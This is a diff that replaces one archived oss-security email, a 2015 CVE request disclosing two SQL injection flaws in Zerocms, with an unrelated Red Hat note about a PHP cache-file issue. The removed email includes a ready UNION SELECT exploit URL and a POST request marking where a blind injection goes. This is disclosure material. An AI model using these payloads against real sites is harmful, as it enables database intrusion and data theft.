@@ -1,64 +1,19 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/01/3
-Message-ID: <CALH-=7wpmvfhuGbL2MB+-9GcS+3Wgz5VJuuZ=f-FcpQWUzWT0w@mail.gmail.com>
-Date: Sun, 1 Feb 2015 09:15:03 +0100
-From: Steffen Rösemann <steffen.roesemann1986@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE-Request -- Zerocms <= v. 1.3.3 -- SQL injection vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/08/5
+Message-ID: <54D7E11A.8080008@redhat.com>
+Date: Sun, 08 Feb 2015 15:20:10 -0700
+From: Kurt Seifried <kseifried@...hat.com>
+To: security@....net, "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: CVE-2013-6501 php: predictible filename used for cache in world writable directory
 Content-Type: text/plain; charset=utf-8
 
-Hi Steve, Josh, vendors, list.
+https://bugzilla.redhat.com/show_bug.cgi?id=1009103
 
-I found two SQL injection vulnerabilities in Zerocms <= v. 1.3.3.
+not sure if this got fixed or not, PHP can you comment?
 
-The first SQL injection vulnerability is located in the article_id
-parameter used in zero_view_article.php and can be exploited even by
-unauthenticated attackers.
+-- 
+Kurt Seifried -- Red Hat -- Product Security -- Cloud
+PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
 
-See the following exploit-example:
 
-http://
-{TARGET}/views/zero_view_article.php?article_id=-1+union+select+database%28%29,2,version%28%29,user%28%29,5,6+--+
-
-The second vulnerability is a Blind SQL injection an is located in the
-user_id parameter used in a POST request in zero_transact_user.php.
-
-An attacker can exploit this vulnerabilitiy in the administrative backend
-via the following POST request exploit-example:
-
-POST /views/zero_transact_user.php HTTP/1.1
-Host: localhost
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0)
-Gecko/20100101 Firefox/35.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: de,en-US;q=0.7,en;q=0.3
-Accept-Encoding: gzip, deflate
-DNT: 1
-Referer: http://{TARGET}/views/zero_user_account.php?user_id=2
-Cookie: PHPSESSID=rirftt07h0dem8d48lujliuve6
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 91
-
-name=user&email=user%40user.de&access_level=1&user_id=2 {SQL injection goes
-here}&action=Modify+Account
-
-Could you please assign a CVE-ID for this?
-
-Thank you very much.
-
-Greetings from Germany.
-
-Steffen Rösemann
-
-References:
-
-[1] http://aas9.in/zerocms/
-[2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-13.html
-[3] https://github.com/perezkarjee/zerocms/issues/3
-[4] https://github.com/sroesemann/zerocms
-[5] https://twitter.com/sroesemann/status/559273548691546113
-[6]
-http://sroesemann.blogspot.de/2015/01/report-for-advisory-sroeadv-2015-14.html
-[7] http://seclists.org/fulldisclosure/2015/Feb/4
-
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
